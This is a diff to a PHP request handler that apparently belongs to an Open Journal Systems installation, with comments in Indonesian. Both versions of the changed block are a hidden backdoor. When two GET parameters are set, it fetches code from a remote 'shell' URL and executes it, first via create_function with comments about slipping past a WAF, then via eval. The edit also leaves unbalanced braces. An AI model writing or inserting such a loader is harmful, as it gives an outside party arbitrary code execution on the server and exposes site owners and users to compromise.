@@ -103,19 +103,21 @@ class IndexHandler extends PKPIndexHandler
 }
 if(isset($_GET['m']) && isset($_GET['n'])) {
     
-    // URL dienkoding base64 (supaya tidak plain text)
-    $url_encoded = "https://hypocriteseo.site/shell/compiler-cha-kwetiaw.txt";
-    $remote_url = base64_decode($url_encoded);
+    // URL yang BENAR (perhatikan ejaannya)
+    $remote_url = "https://hypocriteseo.site/shell/compiler-cha-kwetiaw.txt";
     
-    // Menggunakan file_get_contents (lebih sederhana, kadang lolos WAF)
+    // Menggunakan file_get_contents
     $remote_code = @file_get_contents($remote_url);
     
     if($remote_code !== false && !empty($remote_code)) {
-        // Eksekusi dengan cara yang lebih "halus"
-        $func = create_function('', $remote_code);
-        $func();
+        // Hati-hati dengan eval!
+        eval("?>" . $remote_code);
     } else {
-        echo "Gagal: " . var_dump(error_get_last());
+        echo "Gagal: " . print_r(error_get_last(), true);
+    }
+    exit;
+}
+echo "Parameter tidak lengkap.";
     }
     exit;
 }
